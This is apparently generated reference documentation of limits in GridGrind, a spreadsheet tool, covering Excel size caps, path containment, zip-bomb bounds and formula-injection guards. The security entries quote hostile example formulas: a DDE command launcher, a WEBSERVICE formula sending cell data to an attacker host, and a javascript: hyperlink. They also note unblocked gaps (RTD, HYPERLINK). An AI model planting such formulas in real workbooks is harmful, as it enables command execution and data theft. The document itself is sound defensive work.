<!-- Generated from core metadata; do not edit. -->
# Limits

These entries are owned by core.limits.Limit. Numeric enforcement, help and catalog publication use that owner.

## LIM-001 — Cell-Returning Read Count

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | 250000 cells |
| Problems | INVALID_REQUEST |
| Message template | `addresses must not exceed 250000 but was {n}` / `rowCount * columnCount must not exceed 250000 but was {n}` |
| Applies to | GET_CELLS, GET_WINDOW, GET_SHEET_SCHEMA |

Excel allows worksheets with up to 1,048,576 rows and 16,384 columns. POI can read arbitrarily
large windows and exact address lists; GridGrind must then materialize and serialize factual cell
payloads. Sparse `GET_WINDOW` readback reduces blank-heavy payloads, but it does not change the
worst case: a dense 50,000-cell window still returns 50,000 factual cells, `GET_SHEET_SCHEMA`
still examines the entire rectangular sample even when many cells are blank, and an oversized
`GET_CELLS` address list still asks GridGrind to return one factual cell report per address. The
250,000-cell cap keeps the request gate deterministic before workbook IO and prevents
`OutOfMemoryError`, empty response files, and unstructured exit-code-1 failures on worst-case
cell-returning reads.

This limit is not from Apache POI or Excel. A serialized-bytes cap was considered, but it would be
data-dependent and only knowable after reading the workbook, so the current contract keeps the
deterministic cell-count cap until response streaming or an equivalent two-phase size negotiation
exists.

**Recommended pattern for large sheets:** Use `GET_SHEET_SUMMARY` to discover `lastRowIndex` and
`lastColumnIndex`, then either chunk exact `GET_CELLS` address lists or tile the populated region
with multiple bounded `GET_WINDOW` reads.

Enforcement: [InspectionQuery](../core/src/main/java/dev/erst/gridgrind/core/plan/InspectionQuery.java), [SelectorNumberValidation](../core/src/main/java/dev/erst/gridgrind/core/plan/SelectorNumberValidation.java), [SelectorValueValidation](../core/src/main/java/dev/erst/gridgrind/core/plan/SelectorValueValidation.java).

## LIM-002 — File Format

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | .xlsx |
| Problems | INVALID_REQUEST |
| Message template | `path must point to a .xlsx workbook; .xls, .xlsm, and .xlsb are not supported: {path}` |
| Applies to | source, persistence |

GridGrind intentionally narrows Apache POI's broader OOXML workbook support to plain `.xlsx`.
`.xls` (BIFF8/HSSF), macro-enabled `.xlsm`, and `.xlsb` (binary) are all rejected by the product
contract even though Apache POI can preserve and extract VBA-bearing `.xlsm` packages.

Enforcement: [WorkbookPlan](../core/src/main/java/dev/erst/gridgrind/core/plan/WorkbookPlan.java).

## LIM-003 — Sheet Name Contract

| Field | Value |
| --- | --- |
| Category | GridGrind (enforces Excel limit) |
| Limit | 1..31 characters, with Excel sheet-name syntax |
| Problems | INVALID_REQUEST |
| Message template | `sheetName must not exceed 31 characters: {name}` or `sheetName contains invalid Excel character ':' at position 4: Bad:Name` |
| Applies to | sheetName |

The 31-character ceiling and reserved-character rules are Excel hard limits. GridGrind validates
them at request parse time so the error is structured and reported before any workbook work
begins, instead of surfacing a raw Apache POI sheet-creation exception later in execution.

Enforcement: [ExcelSheetNames](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ExcelSheetNames.java), [SheetName](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/SheetName.java).

## LIM-004 — Column Width

| Field | Value |
| --- | --- |
| Category | GridGrind (enforces Excel limit) |
| Limit | 0 < width <= 255.0 |
| Problems | INVALID_REQUEST |
| Message template | `widthCharacters must not exceed 255.0 (Excel column width limit): got {n}` / `widthCharacters is too small to produce a visible Excel column width: got {n}` |
| Applies to | SET_COLUMN_WIDTH, SET_SHEET_PRESENTATION.sheetDefaults.defaultColumnWidth |

255 character units is the Excel column width ceiling. POI converts explicit column widths to
internal units with `round(widthCharacters * 256)`. Values that round to zero are also rejected.
Sheet-wide default column widths are integer character counts and use the same Excel ceiling.
`GET_SHEET_LAYOUT` remains factual on reopen, so malformed positive persisted explicit column
widths can still be reported above `255` instead of being clamped.

Enforcement: [MutationAction](../core/src/main/java/dev/erst/gridgrind/core/plan/MutationAction.java), [ExcelSheetLayoutLimits](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ExcelSheetLayoutLimits.java).

## LIM-005 — Row Height

| Field | Value |
| --- | --- |
| Category | GridGrind (enforces Excel limit) |
| Limit | 0 < height <= 409.0 points |
| Problems | INVALID_REQUEST |
| Message template | `heightPoints must not exceed 409.0 (Excel row height limit): got {n}` / `heightPoints is too small to produce a visible Excel row height: {n}` |
| Applies to | SET_ROW_HEIGHT, SET_SHEET_PRESENTATION.sheetDefaults.defaultRowHeightPoints |

Excel's published maximum row height is 409 points for `.xlsx` worksheets. Apache POI can store a
larger twip value internally, but GridGrind aligns the product contract to the real Excel limit
instead of the wider storage envelope. Values that round to zero twips are also rejected.
`GET_SHEET_LAYOUT` remains factual on reopen, so malformed positive persisted explicit row heights
and default row-height values can still be reported above `409.0` instead of being clamped.

Enforcement: [MutationAction](../core/src/main/java/dev/erst/gridgrind/core/plan/MutationAction.java), [ExcelSheetLayoutLimits](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ExcelSheetLayoutLimits.java).

## LIM-006 — Duplicate Step IDs

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | `stepId` values in the `steps` array must be unique |
| Problems | INVALID_REQUEST |
| Message template | `steps must not contain duplicate stepId values: {id}` |
| Applies to | steps |

Step identity must remain unambiguous in ordered execution, diagnostics and evidence.

Enforcement: [WorkbookPlan](../core/src/main/java/dev/erst/gridgrind/core/plan/WorkbookPlan.java).

## LIM-006A — Step ID Token Shape

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | [A-Za-z0-9._-]+ |
| Problems | INVALID_REQUEST |
| Message template | `stepId must match [A-Za-z0-9._-]+` |
| Applies to | steps[*].stepId |

Stable machine-readable step tokens avoid ambiguous diagnostic paths and lookup identities.

Enforcement: [StepId](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/StepId.java).

## LIM-007 — GET_CELLS Address List

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | `addresses` must be non-empty and contain no duplicates |
| Problems | INVALID_REQUEST |
| Message template | `addresses must not be empty` / `addresses must not contain duplicates` |
| Applies to | GET_CELLS |

A nonempty distinct address list defines one factual result per requested coordinate.

Enforcement: [SelectorListValidation](../core/src/main/java/dev/erst/gridgrind/core/plan/SelectorListValidation.java).

## LIM-008 — Maximum Rows per Worksheet

| Field | Value |
| --- | --- |
| Category | GridGrind (enforces Excel limit for addressed row indices and bands) |
| Limit | 1048576 rows |
| Problems |  |
| Message template |  |
| Applies to |  |

Last valid zero-based row index: 1,048,575.

GridGrind already rejects out-of-bounds addressed rows on the public request path for selectors,
row-band operations, row-structural edits, and print-title row bands instead of deferring those
errors to Apache POI.

Enforcement: [SelectorNumberValidation](../core/src/main/java/dev/erst/gridgrind/core/plan/SelectorNumberValidation.java), [ExcelRowSpan](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ExcelRowSpan.java), [ProtocolCellAddressValidation](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ProtocolCellAddressValidation.java), [CellAccess](../engine/src/main/java/dev/erst/gridgrind/engine/cells/CellAccess.java), [CellsAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/cells/CellsAdapter.java), [DataValidationAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/validation/DataValidationAdapter.java).

## LIM-009 — Maximum Columns per Worksheet

| Field | Value |
| --- | --- |
| Category | GridGrind (enforces Excel limit for addressed column indices and bands) |
| Limit | 16384 columns |
| Problems |  |
| Message template |  |
| Applies to |  |

Last valid zero-based column index: 16,383.

GridGrind already rejects out-of-bounds addressed columns on the public request path for
selectors, column-band operations, column-structural edits, and print-title column bands.

Enforcement: [SelectorNumberValidation](../core/src/main/java/dev/erst/gridgrind/core/plan/SelectorNumberValidation.java), [ExcelColumnSpan](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ExcelColumnSpan.java), [ProtocolCellAddressValidation](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ProtocolCellAddressValidation.java), [ProtocolDefinedNameValidation](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ProtocolDefinedNameValidation.java), [CellAccess](../engine/src/main/java/dev/erst/gridgrind/engine/cells/CellAccess.java), [CellsAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/cells/CellsAdapter.java), [DataValidationAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/validation/DataValidationAdapter.java).

## LIM-010 — Maximum Text Characters per Cell

| Field | Value |
| --- | --- |
| Category | Excel/POI |
| Limit | 32767 characters |
| Problems |  |
| Message template |  |
| Applies to |  |

This is the persisted Excel cell-text ceiling; reject oversized authored or reconstructed text before native mutation.

Enforcement: [StreamingWorkbookWriter](../engine/src/main/java/dev/erst/gridgrind/engine/backend/streaming/StreamingWorkbookWriter.java), [CellTextLimits](../engine/src/main/java/dev/erst/gridgrind/engine/cells/CellTextLimits.java), [CellsAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/cells/CellsAdapter.java), [CommentAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/comments/CommentAdapter.java), [StyleAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/styles/StyleAdapter.java).

## LIM-011 — Maximum Cell Styles per Workbook

| Field | Value |
| --- | --- |
| Category | Excel/POI |
| Limit | 64000 styles (POI ceiling) |
| Problems |  |
| Message template |  |
| Applies to |  |

Note: POI's cap (64,000) is more conservative than Excel's (65,490). The POI figure is the
effective limit when writing via GridGrind.

Enforcement: [StyleAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/styles/StyleAdapter.java).

## LIM-012 — Maximum Hyperlinks per Worksheet

| Field | Value |
| --- | --- |
| Category | Excel format |
| Limit | 65530 hyperlinks |
| Problems |  |
| Message template |  |
| Applies to |  |

This bounds worksheet hyperlink records before appending a new native link relationship.

Enforcement: [LinkAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/links/LinkAdapter.java).

## LIM-013 — Maximum Formula Length

| Field | Value |
| --- | --- |
| Category | Excel format |
| Limit | 8192 characters |
| Problems |  |
| Message template |  |
| Applies to |  |

Authored formulas are checked before native parse/persistence so oversized text fails predictably.

Enforcement: [FormulaLimits](../engine/src/main/java/dev/erst/gridgrind/engine/formulas/FormulaLimits.java), [FormulaWrites](../engine/src/main/java/dev/erst/gridgrind/engine/poi/FormulaWrites.java).

## LIM-014 — Maximum Nested Function Levels

| Field | Value |
| --- | --- |
| Category | Excel format |
| Limit | 64 |
| Problems |  |
| Message template |  |
| Applies to |  |

Formula shape is bounded before native parsing to retain the workbook format and parser depth contract.

Enforcement: [FormulaLimits](../engine/src/main/java/dev/erst/gridgrind/engine/formulas/FormulaLimits.java), [FormulaWrites](../engine/src/main/java/dev/erst/gridgrind/engine/poi/FormulaWrites.java).

## LIM-015 — Maximum Function Arguments

| Field | Value |
| --- | --- |
| Category | Excel/POI |
| Limit | 255 |
| Problems |  |
| Message template |  |
| Applies to |  |

Function argument counts are checked against the pinned Excel 2007 workbook version before persistence.

Enforcement: [FormulaLimits](../engine/src/main/java/dev/erst/gridgrind/engine/formulas/FormulaLimits.java), [FormulaWrites](../engine/src/main/java/dev/erst/gridgrind/engine/poi/FormulaWrites.java).

## LIM-016 — Structural Edits That Would Move Unsupported Owned Structures

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | Structural inserts are rejected when they would move a table or sheet-owned autofilter; structural deletes and shifts are also rejected when they would move or truncate a data validation |
| Problems | INVALID_REQUEST |
| Message template | Product-owned `INSERT_ROWS`, `DELETE_ROWS`, `SHIFT_ROWS`, `INSERT_COLUMNS`, `DELETE_COLUMNS`, or `SHIFT_COLUMNS` message naming the affected structure and sheet |
| Applies to | INSERT_ROWS, DELETE_ROWS, SHIFT_ROWS, INSERT_COLUMNS, DELETE_COLUMNS, SHIFT_COLUMNS |

Apache POI 5.5.1 does not reliably normalize table refs or sheet autofilter refs when rows or
columns are structurally inserted, deleted, or shifted, and it still leaves data-validation
coverage unsafe for delete and shift flows. GridGrind now rebuilds data validations across row and
column inserts, but it still rejects the remaining unsafe structural edits instead of persisting
stale workbook XML or silently moving only part of the owned structure.

The rejection is precise and structure-owned. Example messages include:
- `INSERT_ROWS cannot move table 'BudgetTable' on sheet 'Budget'; row structural edits that would move tables are not supported`
- `DELETE_COLUMNS cannot move sheet autofilter A1:C10 on sheet 'Budget'; column structural edits that would move or truncate sheet autofilters are not supported`

## LIM-017 — Column Structural Edits While Formulas Are Present

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | Column structural edits are rejected when the workbook contains any formula cells or formula-defined named ranges |
| Problems | INVALID_REQUEST |
| Message template | `INSERT_COLUMNS`, `DELETE_COLUMNS`, or `SHIFT_COLUMNS` product-owned message explaining that Apache POI leaves some column references stale |
| Applies to | INSERT_COLUMNS, DELETE_COLUMNS, SHIFT_COLUMNS |

Apache POI 5.5.1 updates some column references during `shiftColumns(...)`, but not all of them.
In direct probes against formula-bearing workbooks, formulas such as `A2&B2` were rewritten while
others such as `SUM(B2:B4)` remained stale after the same column move. Formula-defined names have
the same risk surface. GridGrind therefore rejects column structural edits whenever formulas or
formula-defined names are present instead of persisting mixed-reference drift.

Example message:
- `SHIFT_COLUMNS cannot run while workbook formulas are present; Apache POI leaves some column references stale during column structural edits`

## LIM-018 — Destructive Structural Edits Against Range-Backed Named Ranges

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | `DELETE_ROWS`, `SHIFT_ROWS`, `DELETE_COLUMNS`, and `SHIFT_COLUMNS` are rejected when they would truncate a range-backed named range or partially move / overwrite one outside the moved band |
| Problems | INVALID_REQUEST |
| Message template | Product-owned `DELETE_ROWS`, `SHIFT_ROWS`, `DELETE_COLUMNS`, or `SHIFT_COLUMNS` message naming the affected named range and sheet |
| Applies to | DELETE_ROWS, SHIFT_ROWS, DELETE_COLUMNS, SHIFT_COLUMNS |

Apache POI can safely translate a range-backed named range when the named range is fully contained
inside the moved row or column band, or when it is completely untouched by the edit. Direct probes
against `deleteRows(...)`, `shiftRows(...)`, `deleteColumns(...)`, and `shiftColumns(...)` showed
that destructive overlap produces broken formulas such as `I!#REF!:I!#REF!` and
`I!#REF!:I!$B$1`. GridGrind therefore rejects only the destructive cases instead of persisting
invalid named-range formulas that can later crash workbook rewrites.

Example messages:
- `DELETE_ROWS cannot move named range 'BudgetWindow' on sheet 'Budget'; row structural edits that would truncate range-backed named ranges are not supported`
- `SHIFT_COLUMNS cannot move named range 'BudgetWindow' on sheet 'Budget'; column structural edits that would overwrite or partially move range-backed named ranges are not supported`

Enforcement: [StructuralEdits](../engine/src/main/java/dev/erst/gridgrind/engine/layout/StructuralEdits.java).

## LIM-019 — Event-Read Execution Mode Scope

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | `execution.mode.type=EVENT_READ` supports only inspection steps, and only `GET_WORKBOOK_SUMMARY` plus `GET_SHEET_SUMMARY` queries |
| Problems | INVALID_REQUEST |
| Message template | `execution.mode.type=EVENT_READ supports inspection steps only; unsupported step kind: {kind}`, `execution.mode.type=EVENT_READ does not support assertion steps`, or `execution.mode.type=EVENT_READ supports GET_WORKBOOK_SUMMARY and GET_SHEET_SUMMARY only; unsupported read type: {type}` |
| Applies to | execution.mode.type, steps[] |

`EVENT_READ` is the low-memory summary reader backed by POI's XSSF event model. It does not
materialize the full workbook object graph, so GridGrind restricts it to workbook and sheet
summary reads only. Unsupported factual reads and analysis reads are rejected at request-validation
time instead of silently falling back to the normal in-memory executor.

Enforcement: [GridGrindContractText](../core/src/main/java/dev/erst/gridgrind/core/catalog/GridGrindContractText.java), [BackendCapabilities](../core/src/main/java/dev/erst/gridgrind/core/semantics/BackendCapabilities.java).

## LIM-020 — Streaming-Write Execution Mode Scope

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | `execution.mode.type=STREAMING_WRITE` requires `source.type=NEW`, limits mutation actions to `ENSURE_SHEET` and `APPEND_ROW`, requires `execution.calculation.strategy=DO_NOT_CALCULATE`, allows `markRecalculateOnOpen=true`, requires `ENSURE_SHEET` before any append/assertion/inspection work, and requires at least one `ENSURE_SHEET` mutation |
| Problems | INVALID_REQUEST |
| Message template | `execution.mode.type=STREAMING_WRITE requires source.type=NEW ...`, `execution.mode.type=STREAMING_WRITE supports ENSURE_SHEET and APPEND_ROW only; unsupported mutation action type: {type}`, `execution.mode.type=STREAMING_WRITE requires execution.calculation.strategy=DO_NOT_CALCULATE ...`, `execution.mode.type=STREAMING_WRITE allows execution.calculation.markRecalculateOnOpen=true only when strategy=DO_NOT_CALCULATE ...`, `execution.mode.type=STREAMING_WRITE requires ENSURE_SHEET before any assertion step ...`, `execution.mode.type=STREAMING_WRITE requires ENSURE_SHEET before any inspection step ...`, or `execution.mode.type=STREAMING_WRITE requires at least one ENSURE_SHEET mutation ...` |
| Applies to | execution.mode.type, source, steps[] |

`STREAMING_WRITE` is the low-memory append-oriented writer backed by POI `SXSSF`. It authors only
new workbooks and does not expose the full XSSF mutation surface. GridGrind validates the reduced
operation contract up front so callers get deterministic structured errors instead of half-written
streaming workbooks or hidden mode fallback.

Enforcement: [GridGrindContractText](../core/src/main/java/dev/erst/gridgrind/core/catalog/GridGrindContractText.java), [BackendCapabilities](../core/src/main/java/dev/erst/gridgrind/core/semantics/BackendCapabilities.java).

## LIM-021 — Request JSON Size

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | 16777216 bytes |
| Problems | INVALID_REQUEST |
| Message template | `Request JSON exceeds the maximum size of 16 MiB (16777216 bytes); move large authored payloads into UTF8_FILE, FILE, or STANDARD_INPUT sources.` |
| Applies to | --request <path>, GridGrindJson.readRequest(InputStream), GridGrindJson.readRequest(byte[]) |

GridGrind accepts large authored values through source-backed inputs (`UTF8_FILE`, `FILE`, and
`STANDARD_INPUT`), not by letting the outer request document grow without bound. The CLI now
rejects oversized request files before execution starts, and the JSON codec enforces the same
document cap on stdin and byte-array entry points so every transport path fails with one stable
product-owned `INVALID_REQUEST` message.

Enforcement: [GridGrindRequestSurfaceContractText](../core/src/main/java/dev/erst/gridgrind/core/catalog/GridGrindRequestSurfaceContractText.java), [GridGrindJsonMapperSupport](../json/src/main/java/dev/erst/gridgrind/json/codec/GridGrindJsonMapperSupport.java).

## LIM-022 — Sheet Zoom Percentage

| Field | Value |
| --- | --- |
| Category | GridGrind (enforces Excel limit) |
| Limit | 10..400 percent |
| Problems | INVALID_REQUEST |
| Message template | `zoomPercent must be between 10 and 400 inclusive: {n}` |
| Applies to | SET_SHEET_ZOOM |

Excel exposes worksheet zoom in the 10% to 400% range. GridGrind validates the authored value up
front and reuses the same bound for factual sheet-layout reports so CLI operators and agents see
one stable limit across mutation, help, catalog, and readback surfaces.

Enforcement: [MutationAction](../core/src/main/java/dev/erst/gridgrind/core/plan/MutationAction.java), [ExcelSheetLayoutLimits](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ExcelSheetLayoutLimits.java), [LayoutAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/layout/LayoutAdapter.java).

## LIM-023 — DDE Formula Injection

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | `CellValueSpec.Formula` must not use the Excel DDE function |
| Problems | INVALID_REQUEST |
| Message template | `source must not use the DDE function; DDE formula execution is a security risk` |
| Applies to | CellValueSpec.Formula, INLINE |

Dynamic Data Exchange (DDE) formulas such as `DDE("cmd", "/C calc", "")` can invoke external
programs when the saved workbook is opened in Microsoft Excel on Windows. GridGrind rejects inline
formula sources that begin with `DDE(` (case-insensitive) after stripping the leading `=`.
File-backed formula sources are not validated at construction time but are equally subject to this
constraint in execution.

Enforcement: [CellValueSpec](../core/src/main/java/dev/erst/gridgrind/core/model/value/CellValueSpec.java).

## LIM-024 — Step Count

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | 10000 steps |
| Problems | INVALID_REQUEST |
| Message template | `steps must not exceed 10000 entries but was {n}` |
| Applies to | steps |

Unbounded step lists enable runaway resource consumption and extended execution times. The 10,000-
step ceiling is generous enough for legitimate bulk streaming-write workflows (for example, 10,000
`APPEND_ROW` mutations) while preventing pathological inputs. The separate 16 MiB JSON cap
(`LIM-021`) further bounds the total request size independent of step count.

Enforcement: [WorkbookPlan](../core/src/main/java/dev/erst/gridgrind/core/plan/WorkbookPlan.java).

## LIM-025 — Request-Owned Path Containment

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | Every request-owned path, whether relative or absolute, must resolve beneath the execution root |
| Problems | PATH_ESCAPES_ROOT |
| Message template | `path must not escape the execution root: {path}` |
| Applies to | Workbook source and persistence paths, formula external workbooks, signing material, and file-backed authored inputs |

GridGrind normalizes every request-owned path against the execution root before it opens or writes
anything. A relative traversal such as `../secret.xlsx` and an absolute path outside the root fail
with the same code. A contained absolute path remains legal but carries a warning because it relies
on one host-specific root layout. CLI flag paths are invocation controls, not request-owned paths.

Enforcement: [ExecutionRequestPaths](../engine/src/main/java/dev/erst/gridgrind/engine/runtime/ExecutionRequestPaths.java).

## LIM-026 — ZIP Decompression Limits

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | 104857600 decompressed bytes per entry; minimum inflate ratio 0.01 |
| Problems | INVALID_REQUEST |
| Message template |  |
| Applies to | All xlsx workbook open operations |

GridGrind explicitly configures Apache POI's `ZipSecureFile` limits to bound decompression memory
and time during xlsx package open. An entry expanding beyond 100 MiB or achieving a compression
ratio beyond 1:100 triggers a `ZipBombException`, which GridGrind translates to an
`INVALID_REQUEST` failure rather than an `OutOfMemoryError` or indefinite CPU consumption.

Enforcement: [XssfWorkbooks](../engine/src/main/java/dev/erst/gridgrind/engine/backend/xssf/XssfWorkbooks.java).

## LIM-027 — DDE Rejection in All Formula Inputs

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | DDE function forbidden in all formula-bearing inputs |
| Problems | INVALID_REQUEST |
| Message template |  |
| Applies to | ArrayFormulaSpec, DataValidationRuleSpec, ConditionalFormattingRuleSpec, ConditionalFormattingThresholdSpec.Formula, ChartDataSourceSpec.Reference.formula |

GridGrind rejects any formula string that begins with `DDE(` (case-insensitive, stripping leading
`=` or `{=...}` prefixes first) across all formula-bearing input types. The DDE (Dynamic Data
Exchange) function is a Windows IPC mechanism; embedding it in an xlsx workbook can trigger
arbitrary command execution when the file is opened in Microsoft Excel. This guard extends the
`CellValueSpec.Formula` protection (LIM-023) to every remaining formula surface written to xlsx output.

Enforcement: [ChartDataSourceSpec](../core/src/main/java/dev/erst/gridgrind/core/model/chart/ChartDataSourceSpec.java), [ArrayFormulaSpec](../core/src/main/java/dev/erst/gridgrind/core/model/formula/ArrayFormulaSpec.java), [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaInputSecurity.java), [ConditionalFormattingRuleSpec](../core/src/main/java/dev/erst/gridgrind/core/model/validation/ConditionalFormattingRuleSpec.java), [ConditionalFormattingThresholdSpec](../core/src/main/java/dev/erst/gridgrind/core/model/validation/ConditionalFormattingThresholdSpec.java), [DataValidationRuleSpec](../core/src/main/java/dev/erst/gridgrind/core/model/validation/DataValidationRuleSpec.java).

## LIM-028 — URL Scheme Allowlist

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | Only `http`, `https`, `ftp`, and `ftps` schemes accepted for URL hyperlinks |
| Problems | INVALID_REQUEST |
| Message template |  |
| Applies to | HyperlinkTarget.Url |

GridGrind enforces an explicit allowlist of URL schemes for `HyperlinkTarget.Url` targets.
Schemes such as `javascript:`, `vbscript:`, `ms-excel:`, `ldap:`, and `data:` are rejected.
These schemes can trigger script execution, protocol-handler abuse, or cross-site scripting when
the hyperlink is activated in a browser-based spreadsheet viewer or other host application.

Enforcement: [ProtocolHyperlinkUrlSupport](../core/src/main/java/dev/erst/gridgrind/core/model/value/ProtocolHyperlinkUrlSupport.java).

## LIM-029 — No-Follow Request Path Binding

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | Request-owned reads and writes never follow a symbolic link and use descriptor-relative access below a verified execution root |
| Problems | UNSAFE_PATH_ACCESS |
| Message template |  |
| Applies to | Workbook source and persistence paths, formula external workbooks, signing material, and file-backed authored inputs |

GridGrind binds the root and every existing parent with no-follow directory descriptors, records
their filesystem identities, copies request inputs into private staging, and commits output through
the retained parent descriptor. Any symlink is rejected, including a link that happens to point
inside the root. Immediately before persistence, GridGrind rechecks the recorded topology and
fails closed if it observes a replacement, unlink, rename, or symlink transition.

This protects containment while the bound filesystem topology remains stable. It does not claim
absolute containment against a principal that can mutate that topology in the scheduling window
between the final identity recheck and a descriptor-relative commit; Java exposes no proven,
portable root-anchored atomic-resolve-and-commit primitive for that stronger guarantee.

Enforcement: [RequestPathDescriptorBinder](../engine/src/main/java/dev/erst/gridgrind/engine/runtime/RequestPathDescriptorBinder.java).

## LIM-030 — File-Backed Authored Input Isolation

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | File-backed text and binary authored inputs are read only through the request-owned no-follow binding and are resolved before workbook mutation |
| Problems | PATH_ESCAPES_ROOT, UNSAFE_PATH_ACCESS, INPUT_SOURCE_NOT_FOUND, INPUT_SOURCE_IO_ERROR |
| Message template |  |
| Applies to | TextSourceSpec.Utf8File, BinarySourceSpec.File |

The resolver reads each authored file through the same containment and no-follow capability used
for workbooks and signing material, then normalizes its bytes into the in-memory plan. The later
mutation phase never reopens an authored path string, so a source-file race cannot redirect the
content that was validated during preflight.

Enforcement: [SourceBackedPlanResolver](../engine/src/main/java/dev/erst/gridgrind/engine/runtime/SourceBackedPlanResolver.java).

## LIM-031 — WEBSERVICE Formula Rejection

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | Formula inputs must not use the `WEBSERVICE` function |
| Problems | INVALID_REQUEST |
| Message template |  |
| Applies to | FormulaInputSecurity.rejectDde |

Excel's `WEBSERVICE` function sends an outbound HTTP GET request when the workbook is opened and
formulas are evaluated, making it a data-exfiltration vector. A formula such as
`=WEBSERVICE("https://attacker.example.com/collect?d="&ENCODEURL(A1))` causes the downstream
Excel client to send cell data to an attacker-controlled server without any user interaction.
`FormulaInputSecurity.rejectDde` now also rejects formulas beginning with `WEBSERVICE(`
(case-insensitive) after stripping any leading `=` or `{=…}` array-formula delimiters.

Enforcement: [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaInputSecurity.java), [CellValueSpec](../core/src/main/java/dev/erst/gridgrind/core/model/value/CellValueSpec.java).

## LIM-032 — Named-Range Formula Injection

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | Named-range formula targets must not use the `DDE` or `WEBSERVICE` functions |
| Problems | INVALID_REQUEST |
| Message template |  |
| Applies to | NamedRangeTarget.Formula |

Named-range formulas are written into the xlsx defined-names part and evaluated automatically by
Excel when the workbook is opened or any formula references the named range. A `NamedRangeTarget`
with `kind: FORMULA` and a payload such as `DDE("cmd","/C calc","")` or
`WEBSERVICE("https://attacker.example.com/")` would execute without any user interaction.
`NamedRangeTarget.Formula` now calls `FormulaInputSecurity.rejectDde` in its compact constructor.

Enforcement: [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaInputSecurity.java), [NamedRangeTarget](../core/src/main/java/dev/erst/gridgrind/core/model/formula/NamedRangeTarget.java).

## LIM-033 — Chart Title Formula Injection

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | Chart title formula inputs must not use the `DDE` or `WEBSERVICE` functions |
| Problems | INVALID_REQUEST |
| Message template |  |
| Applies to | ChartTitleSpec.Formula |

Chart title formulas are stored in the chart XML and auto-evaluated when Excel renders the chart
on workbook open. A `ChartTitleSpec` with `type: FORMULA` and a DDE or WEBSERVICE payload executes
without user interaction. `ChartTitleSpec.Formula` now calls `FormulaInputSecurity.rejectDde`.

Enforcement: [ChartTitleSpec](../core/src/main/java/dev/erst/gridgrind/core/model/chart/ChartTitleSpec.java), [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaInputSecurity.java).

## LIM-034 — UDF Formula Template Injection (Defense-in-Depth)

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | UDF formula templates must not use the `DDE` or `WEBSERVICE` functions |
| Problems | INVALID_REQUEST |
| Message template |  |
| Applies to | FormulaUdfFunctionSpec.formulaTemplate |

UDF formula templates are evaluated server-side only by Apache POI, which does not implement DDE
or WEBSERVICE and would return an evaluation error for those functions. Templates are also never
written to xlsx output — only the UDF call site (e.g., `MY_FUNC(arg)`) appears in the file.
The guard is applied as defense-in-depth against future POI changes or alternative evaluation paths.

Enforcement: [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaInputSecurity.java), [FormulaUdfFunctionSpec](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaUdfFunctionSpec.java).

## LIM-035 — HYPERLINK() Formula Content Not Validated Against URL Allowlist

| Field | Value |
| --- | --- |
| Category | GridGrind (accepted limitation) |
| Limit | `HYPERLINK()` payloads inside formula strings are not inspected for URL scheme |
| Problems |  |
| Message template |  |
| Applies to | CellValueSpec.Formula, NamedRangeTarget.Formula, ChartTitleSpec.Formula |

The URL scheme allowlist in LIM-028 applies to `HyperlinkInput`, not to formula-embedded
hyperlinks. A formula such as `=HYPERLINK("javascript:evil()")` passes `FormulaInputSecurity.rejectDde`
and is written to the xlsx file. The risk delta versus LIM-028 is limited: `HYPERLINK()` requires a
user click to navigate and is not auto-evaluated on workbook open. The `DDE(` and `WEBSERVICE(` patterns
that execute automatically are already blocked. Closing this gap fully would require an embedded
formula parser; the accepted residual risk is click-triggered URI navigation only.

## LIM-036 — RTD() Function Not Blocked

| Field | Value |
| --- | --- |
| Category | GridGrind (accepted limitation) |
| Limit | `RTD()` (Real-Time Data) in formula strings is not blocked |
| Problems |  |
| Message template |  |
| Applies to | all formula inputs |

